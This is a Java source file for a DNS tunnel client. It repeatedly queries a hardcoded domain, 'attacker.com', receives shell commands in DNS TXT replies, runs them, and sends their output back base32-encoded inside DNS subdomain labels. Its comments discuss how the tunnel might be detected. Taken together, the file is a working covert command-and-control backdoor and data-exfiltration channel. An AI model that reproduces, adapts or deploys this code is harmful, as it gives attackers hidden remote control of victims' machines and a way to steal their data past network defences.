import java.util.ArrayList;
import java.util.Hashtable;
import java.util.LinkedList;
import java.util.List;
import java.util.Queue;
import javax.naming.Context;
import javax.naming.NamingEnumeration;
import javax.naming.NamingException;
import javax.naming.directory.Attributes;
import javax.naming.directory.BasicAttribute;
import javax.naming.directory.InitialDirContext;

// TODO: re-write it to be able to run on older Java versions
//       currently it is not possible, for example, because it uses lambda
public class DNSTunnelClient implements Runnable, DNSTunnelConstants {

    private static final boolean DEBUG = true;
    private static final long DELAY = 3000;

    // TODO: it may be probably increased a little bit
    private static final int OUTPUT_FRAGMENT_LEN = 25;

    private final String domain;
    private boolean stopped = false;
    private final Queue<String> commands = new LinkedList<>();


    public DNSTunnelClient(String domain) {
        this.domain = domain;
    }

    static void start(String domain) {
        new Thread(new DNSTunnelClient(domain)).start();
    }

    @Override
    public void run() {
        while (!stopped) {
            try {
                // TODO: the delay may be probably removed or decreased
                Thread.sleep(DELAY);
            } catch (InterruptedException e) {
                // ignore
                debug("unexpeced exception: " + e);
            }

            // try to get a new command if the queue is empty
            if (commands.isEmpty()) {
                String newCommand = retrieveCommand();
                if (newCommand == null) {
                    continue;
                }
                commands.add(newCommand);
            }

            // run a command, and send output
            if (!commands.isEmpty()) {
                String command = commands.poll();
                switch (command) {
                    case STOP:
                        stopped = true;
                        break;
                    default:
                        List<String> output = new Command(command).getOutput();
                        List<String> newCommands = sendOutput(output);
                        commands.addAll(newCommands);
                }
            }
        }
    }

    private String retrieveCommand() {
        // the message starts with a unique id to prevent cache hits
        // TODO: messages starts with the same char sequence,
        //       so the tunnel may be detected
        String request = getID() + SEPARATOR;
        debug("retrieveCommand(): request = " + request);
        String host = BASE32.encodeToString(request) + "." + domain;
        String txt = resolve(host);
        if (txt == null) {
            debug("could't retrieve a command");
            return null;
        }
        return txt;
    }

    private List<String> sendOutput(List<String> output) {
        // concatenate lines
        StringBuilder sb = new StringBuilder();
        output.stream().
                forEach((line) -> {
                    sb.append(line).append("\n");
        });

        // fragmentation, a label shouldn't exceed 63 octets
        // TODO: a DNS name shouldn't exceed 255 octets, so it is possible
        //       send more data one request
        //
        //       also a unique ID may be sent as a separate label
        String data = sb.toString();
        int start = 0;
        List<String> newCommands = new ArrayList<>();
        while (start < data.length()) {
            String request = getID() + SEPARATOR;
            if (start + OUTPUT_FRAGMENT_LEN < data.length()) {
                request += data.substring(start, start + OUTPUT_FRAGMENT_LEN);
            } else {
                request += data.substring(start);
            }

            // send a request, and retrieve new commands
            String host = BASE32.encodeToString(request) + "." + domain;
            String command = resolve(host);
            if (command != null) {
                newCommands.add(command);
            }
            start += OUTPUT_FRAGMENT_LEN;
        }

        return newCommands;
    }

    private String resolve(String host) {
        debug("resolve(): host = " + host);
        String txt = null;
        try {
            Hashtable<String, String> env = new Hashtable<>();
            env.put(Context.INITIAL_CONTEXT_FACTORY,
                    "com.sun.jndi.dns.DnsContextFactory");

            // TODO: it probably should work without these settings
            env.put("com.example.jndi.dns.recursion", "false");
            env.put("com.example.jndi.dns.timeout.retries", "0");
            env.put("com.example.jndi.dns.timeout.initial", "5000");

            InitialDirContext context = new InitialDirContext(env);
            Attributes attributes = context.getAttributes(
                    host, new String[] {"A", "TXT"});
            NamingEnumeration<?> attributeEnumeration = attributes.getAll();
            while (attributeEnumeration.hasMore()) {
                Object attr = attributeEnumeration.next();
                if (attr instanceof BasicAttribute) {
                    BasicAttribute basicAttribute = (BasicAttribute) attr;
                    debug("resolve(): attribute: " + basicAttribute.getID());
                    if (basicAttribute.getID().equals(QType.TXT.getName())) {
                        Object value = basicAttribute.get();
                        if (value instanceof String) {
                            txt = (String) value;
                            break;
                        } else {
                            debug("could't parse TXT attribute");
                        }
                    } else if (DEBUG) {
                        debug("resolve(): basicAttribute: " + basicAttribute);
                    }
                }
            }
            attributeEnumeration.close();
        }
        catch (NamingException e) {
            debug("unexpected exception: " + e);
            e.printStackTrace(System.out);
        }
        return txt;
    }

    // TODO: it should depend on DELAY
    private String getID() {
        return "" + System.currentTimeMillis() / 1000;
    }

    private static void debug(String message) {
        if (DEBUG) {
            System.out.println("debug: " + message);
        }
    }

    public static void main(String[] args) {
        String domain = "attacker.com";

        // test
        DNSTunnelClient client = new DNSTunnelClient(domain);
        String txt = client.resolve("google.com");
        if (txt == null) {
            //throw new RuntimeException("cannot resolve a host name");
        }
        debug("txt = " + txt);

        // start
        DNSTunnelClient.start(domain);
    }

}

